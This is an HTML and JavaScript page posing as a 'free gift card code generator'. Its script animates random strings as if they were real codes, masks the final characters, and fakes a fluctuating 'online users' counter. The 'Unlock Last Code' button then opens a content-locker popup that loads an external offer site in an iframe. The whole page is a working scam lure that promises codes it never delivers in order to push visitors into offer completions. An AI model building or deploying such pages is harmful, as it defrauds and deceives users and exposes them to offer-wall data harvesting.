<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Generator</title>
<style>
body{margin:0;padding:0;font-family:Arial;background:#f1f1f1;display:flex;justify-content:center;align-items:center;min-height:100vh;}
.container{position:relative;width:100%;max-width:420px;background:rgba(255,255,255,0.9);border-radius:20px;padding:20px;text-align:center;box-shadow:0 10px 25px rgba(0,0,0,0.15);z-index:1;}
.header img{width:180px;margin-bottom:10px}
h1{font-size:22px;margin-bottom:15px;}
#stage{min-height:160px;display:flex;flex-direction:column;justify-content:center;align-items:center;}
.temp-code{font-size:16px;font-weight:bold;letter-spacing:1px;white-space:nowrap;margin-bottom:10px;}
.card-img{width:150px;border-radius:14px;box-shadow:0 6px 12px rgba(0,0,0,.2);margin-bottom:10px;}
button{display:none;margin-top:15px;padding:13px 30px;border:none;border-radius:12px;background:#e60023;color:#fff;font-size:16px;font-weight:bold;cursor:pointer;box-shadow:0 5px 0 #b0001a;}
.status{margin-top:18px;font-size:13px;color:#333;}
.footer{margin-top:12px;font-size:11px;color:#777;}

/* POPUP LOCKER */
#lockerPopup{
position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:none;justify-content:center;align-items:center;z-index:9999;
}
#lockerBox{width:95%;max-width:400px;height:520px;background:#fff;border-radius:14px;overflow:hidden;position:relative;}
#lockerBox iframe{width:100%;height:100%;border:none;}
</style>
</head>
<body>

<div class="container">
<div class="header">
<img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/16456066916a38f76ae3e8e9726290ecaff38046f2.png">
<h1>FREE GIFT CARD CODE</h1>
</div>

<div id="stage"></div>

<button id="unlockBtn">Unlock Last Code</button>

<div class="status">
Server Status: <span class="green">Online</span> — Online Users: <span id="users">223</span>
</div>

<div class="footer">Copyright © Free Gift Card Code</div>
</div>

<!-- LOCKER POPUP -->
<div id="lockerPopup">
  <div id="lockerBox">
    <iframe id="lockerFrame"></iframe>
  </div>
</div>

<script>
// 12 Cards
const cards=[
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16454931964ae4b735cb411f2de267110a434da371.png",
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16454932785b7b640a16766af88f84901c26fde30d.png",
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/1645606691ccf0a7bdb704e85631127b851dc0e997.png",
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16456066913af5eafc1e8f4b67bdb9fad531193dd3.png",
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16470047894e0de69106b6d5dc5add9dcfe186f25e.png",
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16456066910ad995c478735eeb59daf47640f653e3.png",
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/1645606690dfe4c50e8dab48f102c825bbb91242c3.png",
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/1645606690bc25555bab4430a7900a83e596aef47d.png",
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/1645606690860b44915e39951ccef2f78aae356a84.png",
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/1645606690250c6c064370ec8752e020ce647d55a1.png",
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/164560669197909a539d87aced1c1438c4da903d01.png",
"https://d13pxqgp3ixdbh.cloudfront.net/uploads/16456066916e6559533a5e292ccba8bb80f9149007.png"
];
let i=Math.floor(Math.random()*12);

const stage=document.getElementById("stage");
const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
const gen=n=>Array.from({length:n},()=>chars[Math.floor(Math.random()*chars.length)]).join("");

// Suspense code
let temp=document.createElement("div");
temp.className="temp-code";
stage.appendChild(temp);

let count=0;
const fast=setInterval(()=>{
temp.innerText=`${gen(4)}-${gen(4)}-${gen(4)}-${gen(4)}`;
count++;
if(count===10){
clearInterval(fast);
setTimeout(()=>{
stage.innerHTML="";
let card=document.createElement("img");
card.src=cards[i];
card.className="card-img";
stage.appendChild(card);
setTimeout(()=>{
let final=document.createElement("div");
final.className="temp-code";
final.innerText=`${gen(4)}-${gen(4)}-${gen(4)}-####`;
stage.appendChild(final);
setTimeout(()=>{document.getElementById("unlockBtn").style.display="inline-block";},300);
},300);
},300);
}
},120);

// Users
let u=223;
setInterval(()=>{u+=Math.floor(Math.random()*5)-2;u=Math.min(999,Math.max(150,u));document.getElementById("users").innerText=u;},2000);

// Popup Locker
const unlockBtn=document.getElementById("unlockBtn");
const lockerPopup=document.getElementById("lockerPopup");
const lockerFrame=document.getElementById("lockerFrame");

unlockBtn.onclick=()=>{
lockerPopup.style.display="flex";
lockerFrame.src="https://best-offer.pages.dev/";
};

// Close on background click
lockerPopup.onclick=(e)=>{
if(e.target===lockerPopup){
lockerPopup.style.display="none";
lockerFrame.src="";
}
};
</script>

</body>
</html>
